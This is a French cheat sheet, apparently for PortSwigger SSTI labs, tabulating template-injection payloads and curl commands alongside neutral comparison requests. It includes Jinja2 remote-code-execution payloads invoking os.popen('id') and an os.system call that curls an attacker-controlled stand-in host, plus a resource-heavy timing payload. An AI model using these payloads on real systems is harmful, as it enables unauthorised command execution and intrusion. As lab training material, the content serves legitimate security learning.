# SSTI 

Voici un tableau synthétique pour l’analyse et la découverte des failles SSTI (Server-Side Template Injection) sur les labs PortSwigger, **avec des commandes curl différenciées pour l’attaque et l’analyse** selon chaque cas, des charges utiles neutres, et des explications claires en français :

| Type / Lab                               | Payload d’attaque neutre (exemple) | Commande d’attaque (curl)                                                                                      | Commande(s) d’analyse curl                                                                                  | Élément d’analyse (raison préalable)                          | Méthodologie détaillée de découverte                                                                                   | URL PortSwigger ou source utile                                      |
|-------------------------------------------|-------------------------------------|----------------------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|----------------------------------------------------------------|-----------------------------------------------------------------------------------------------------------------------|---------------------------------------------------------------------|
| SSTI basique (réponse visible)            | {{7*7}}                             | curl -X POST -d "name={{7*7}}" https://LAB/submit                                                              | curl -X POST -d "name=test" https://LAB/submit                                                              | Affichage d’un résultat calculé dans la réponse                | Injectez une expression simple dans un champ affiché côté serveur. Comparez la réponse avec une valeur neutre. Si le calcul s’affiche (ex : 49), la faille est présente. | https://portswigger.net/web-security/server-side-template-injection/lab-server-side-template-injection-basic |
| SSTI avec erreur (détection moteur)        | {{aaaa}}                            | curl -X POST -d "name={{aaaa}}" https://LAB/submit                                                             | curl -X POST -d "name=test" https://LAB/submit                                                              | Message d’erreur spécifique au moteur de template              | Injectez une expression ou variable inconnue pour provoquer une erreur. Analysez le message d’erreur pour identifier le moteur utilisé (Jinja2, Twig, Freemarker, etc.). | https://portswigger.net/web-security/server-side-template-injection |
| SSTI sandboxée (tentative d’évasion)       | {{config.items()}}                  | curl -X POST -d "name={{config.items()}}" https://LAB/submit                                                   | curl -X POST -d "name=test" https://LAB/submit                                                              | Affichage d’objets internes ou d’erreur de sandbox             | Injectez une expression visant à accéder à des objets internes ou à sortir du sandbox. Comparez la réponse à une requête neutre pour détecter une fuite d’info ou une erreur. | https://portswigger.net/web-security/server-side-template-injection |
| SSTI RCE (exécution de commande)           | {{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}} | curl -X POST -d "name={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}" https://LAB/submit | curl -X POST -d "name=test" https://LAB/submit                                                              | Affichage du résultat d’une commande système                   | Injectez une payload permettant d’exécuter une commande système (selon le moteur). Si le résultat de la commande s’affiche, la faille permet une RCE. | https://portswigger.net/web-security/server-side-template-injection |
| SSTI aveugle (time-based)                  | {{range(10**8)}}                    | curl -X POST -d "name={{range(10**8)}}" --max-time 15 -w "%{time_total}\n" https://LAB/submit                  | curl -X POST -d "name=test" --max-time 15 -w "%{time_total}\n" https://LAB/submit                            | Temps de réponse anormalement long                              | Injectez une expression qui provoque un délai d’exécution. Comparez le temps de réponse à une requête neutre. Un délai anormal indique une SSTI aveugle. | https://portswigger.net/web-security/server-side-template-injection |
| SSTI avec interaction externe (OAST)        | {{cycler.__init__.__globals__.os.system('curl http://votre-serveur.com/ssti')}} | curl -X POST -d "name={{cycler.__init__.__globals__.os.system('curl http://votre-serveur.com/ssti')}}" https://LAB/submit | Surveillez les requêtes sur votre serveur externe (tcpdump, Burp Collaborator, logs web)                    | Détection d’une requête sortante sur votre serveur              | Injectez une commande qui force le serveur à contacter une URL que vous contrôlez. Surveillez votre serveur pour détecter une connexion sortante (preuve d’exécution de la commande). | https://portswigger.net/web-security/server-side-template-injection |

---

